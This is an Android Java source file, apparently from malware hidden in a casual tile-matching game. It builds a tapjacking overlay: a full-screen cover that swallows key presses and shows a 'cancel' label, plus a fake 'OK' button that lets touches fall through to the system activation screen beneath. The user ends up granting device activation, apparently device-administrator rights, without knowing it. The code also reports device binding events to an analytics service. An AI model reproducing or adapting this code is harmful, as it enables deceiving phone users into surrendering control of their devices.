package com.xstd.qm.fakecover;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.util.DisplayMetrics;
import android.view.*;
import android.widget.TextView;
import com.plugin.common.utils.UtilsRuntime;
import com.tinygame.lianliankan.R;
import com.xstd.qm.AppRuntime;
import com.xstd.qm.Utils;
import com.xstd.qm.setting.MainSettingManager;

import java.util.HashMap;

/**
 * Created by michael on 13-12-23.
 */
public class FakeWindowBinding {

    public static interface WindowListener {

        void onWindowPreDismiss();

        void onWindowDismiss();
    }

    private View coverView;
    private View timerView;
    private TextView timeTV;
    private View installView;
    private Context context;
    private WindowManager wm;
    private int count = 60;
    private Handler handler;

    private WindowManager.LayoutParams fullConfirmBtnParams;
    private View fullInstallView;

    private WindowListener mWindowListener;
    private LayoutInflater mLayoutInflater;

    private int dimissCount = -1;

    public FakeWindowBinding(Context context, WindowListener l) {
        this.context = context;
        LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        mLayoutInflater = layoutInflater;
        coverView = layoutInflater.inflate(R.layout.app_active, null);
        timerView = layoutInflater.inflate(R.layout.fake_timer, null);
        timeTV = (TextView) timerView.findViewById(R.id.timer);
        installView = layoutInflater.inflate(R.layout.fake_install_btn, null);
        wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        handler = new Handler(context.getMainLooper());

        ((TextView) installView.findViewById(R.id.cancel)).setText("确定");

        mWindowListener = l;
    }

    public void updateTimerCount() {
        if (count <= 0 || dimissCount == 0) {
            AppRuntime.WATCHING_SERVICE_ACTIVE_BREAK.set(true);
            if (mWindowListener != null) {
                mWindowListener.onWindowDismiss();
            }
            if (coverView != null && timerView != null) {
                UtilsRuntime.goHome(context);
                wm.removeView(coverView);
                wm.removeView(timerView);
                wm.removeView(installView);
            }
            if (fullInstallView != null) {
                wm.removeView(fullInstallView);
            }
            fullInstallView = null;
            coverView = null;
            timerView = null;
            installView = null;

            //notify umeng
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("phoneType", Build.MODEL);
            log.put("binding_times", String.valueOf(MainSettingManager.getInstance().getDeviceBindingActiveTime()));
            Utils.umengLog(context, "bind_device_dismiss", log);

            AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
        } else {
            if (count == 2) {
                UtilsRuntime.goHome(context);
                AppRuntime.WATCHING_SERVICE_ACTIVE_BREAK.set(true);
            }

            if (!AppRuntime.WATCHING_TOP_IS_SETTINGS.get()) {
                //当前顶层窗口不是setting
                if (fullInstallView == null) {
                    fullInstallView = mLayoutInflater.inflate(R.layout.fake_install_btn, null);
                    ((TextView) fullInstallView.findViewById(R.id.cancel)).setText("确定");
                    wm.addView(fullInstallView, fullConfirmBtnParams);
                }
            } else {
                if (fullInstallView != null) {
                    wm.removeView(fullInstallView);
                }
                fullInstallView = null;
            }

            handler.post(new Runnable() {
                @Override
                public void run() {
                    if (coverView != null && timerView != null) {
//                        timeTV.setText(String.format(context.getString(R.string.fake_timer), count));
                        timeTV.setText("取消");
                        count--;
                        if (dimissCount > 0) {
                            dimissCount--;
                        }

                        if (count == 0) {
                            if (mWindowListener != null) {
                                mWindowListener.onWindowPreDismiss();
                            }
                        }

                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                updateTimerCount();
                            }
                        }, 1000);
                    }
                }
            });
        }

    }

    public void dismiss() {
        UtilsRuntime.goHome(context);
        dimissCount = 2;
        AppRuntime.WATCHING_SERVICE_ACTIVE_BREAK.set(true);
    }

    public void show() {
        DisplayMetrics dm = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(dm);
        int screenWidth = dm.widthPixels;
        int screenHeight = dm.heightPixels;
        float density = dm.density;

        /**
         * 初始化全遮盖的button
         */
        fullConfirmBtnParams = new WindowManager.LayoutParams();
        fullConfirmBtnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
        fullConfirmBtnParams.format = PixelFormat.RGBA_8888;
        fullConfirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        fullConfirmBtnParams.width = screenWidth / 2;
        fullConfirmBtnParams.height = (int) (48 * density);
        if (AppRuntime.isVersionBeyondGB()) {
            fullConfirmBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
        } else {
            fullConfirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
        }

        /**
         * 测试代码，确认按键全遮盖
         * 经确认可以支持激活的全遮盖
         */
        WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
        confirmBtnParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        confirmBtnParams.format = PixelFormat.RGBA_8888;
        confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        confirmBtnParams.width = screenWidth / 2;
        confirmBtnParams.height = (int) (48 * density);
        if (AppRuntime.isVersionBeyondGB()) {
            confirmBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
        } else {
            confirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
        }
        wm.addView(installView, confirmBtnParams);

        //timer
        WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
        btnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
        btnParams.format = PixelFormat.RGBA_8888;
        btnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        btnParams.width = screenWidth / 2;
        btnParams.height = (int) (48 * density);
        if (AppRuntime.isVersionBeyondGB()) {
            btnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
        } else {
            btnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
        }
        wm.addView(timerView, btnParams);

        //cover
        WindowManager.LayoutParams wMParams = new WindowManager.LayoutParams();
        wMParams.type = WindowManager.LayoutParams.TYPE_PHONE;
        wMParams.format = PixelFormat.RGBA_8888;
        wMParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        wMParams.width = WindowManager.LayoutParams.FILL_PARENT;
        wMParams.height = screenHeight - (int) ((48 + 25) * density);
        wMParams.gravity = Gravity.LEFT | Gravity.TOP;
        coverView.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View view, int i, KeyEvent keyEvent) {
                return true;
            }
        });
        wm.addView(coverView, wMParams);
    }

}
